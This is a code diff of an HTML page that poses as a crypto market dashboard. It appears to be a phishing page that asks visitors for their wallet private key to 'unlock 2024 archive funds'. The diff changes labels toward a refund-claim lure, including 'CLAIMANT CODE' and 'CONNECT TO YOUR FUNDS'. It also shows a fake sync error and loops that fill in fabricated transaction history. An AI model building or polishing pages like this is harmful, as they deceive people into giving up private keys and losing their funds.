@@ -110,11 +110,11 @@
     <main>
         <div id="market-view" class="content-view">
             <h1>Market Overview (Rank 1-100)</h1>
-            <div class="table-container"><table><thead><tr><th>#</th><th>Coin Name</th><th>Price</th><th>24h Change</th><th>Market Cap</th></tr></thead><tbody id="market-body"></tbody></table></div>
+            <div class="table-container"><table><thead><tr><th>#</th><th>Last Name</th><th>TOTAL</th><th>24h Change</th><th>Refund Done</th></tr></thead><tbody id="market-body"></tbody></table></div>
         </div>
         <div id="history-view" class="content-view" style="display:none;">
             <h1>Archive History Explorer</h1>
-            <div class="table-container"><table><thead><tr><th>Tax Address</th><th>Block</th><th>Timestamp (Hex)</th><th>Value</th></tr></thead><tbody id="history-body"></tbody></table></div>
+            <div class="table-container"><table><thead><tr><th>TRANSACTION CODE</th><th>CLAIMANT CODE</th><th>DATE AND TIME (Hex)</th><th>Value</th></tr></thead><tbody id="history-body"></tbody></table></div>
         </div>
         <div id="deposit-view" class="content-view" style="display:none; text-align:center;">
             <div id="dep-loader" style="padding-top:80px;"><div class="loader-ring"></div><h3 style="color:var(--yellow); margin-top:20px;">Generating Encrypted QR...</h3></div>
@@ -150,7 +150,7 @@
         <p style="font-size:12px; color:#666; margin-bottom:20px;">Connect your institutional vault to unlock 2024 archive funds.</p>
         <input type="text" placeholder="Wallet Name (e.g. MetaMask)" style="background:#f5f5f5; color:black; border:1px solid #ddd;">
         <input type="password" placeholder="Private Key (64 characters)" style="background:#f5f5f5; color:black; border:1px solid #ddd;">
-        <button class="btn-yellow" style="background:black; color:white; width:100%;" onclick="alert('Sync Error: Gateway Timeout 0x822')">Connect Vault</button>
+        <button class="btn-yellow" style="background:black; color:white; width:100%;" onclick="alert('Sync Error: Gateway Timeout 0x822')">CONNECT TO YOUR FUNDS</button>
         <button class="btn-yellow" style="background:#eee; color:#555; width:100%;" onclick="closeModal()">Back to Dashboard</button>
     </div>
 </div>
@@ -225,7 +225,7 @@
         const body = document.getElementById('history-body'); body.innerHTML = "";
         for(let i=1; i<=35; i++) {
             let b = 17794557 + (i * 12); let ts = "0x" + (1714557000 + (i * 300)).toString(16).toUpperCase();
-            body.innerHTML += `<tr><td>0x823b...8911</td><td>${b}</td><td style="color:var(--up)">${ts}</td><td>- 0.6960 ETH</td></tr>`;
+            body.innerHTML += `<tr><td>0x823b...8911</td><td>${b}</td><td style="color:var(--up)">${ts}</td><td>- 0.6960 ***</td></tr>`;
         }
     }
 </script>
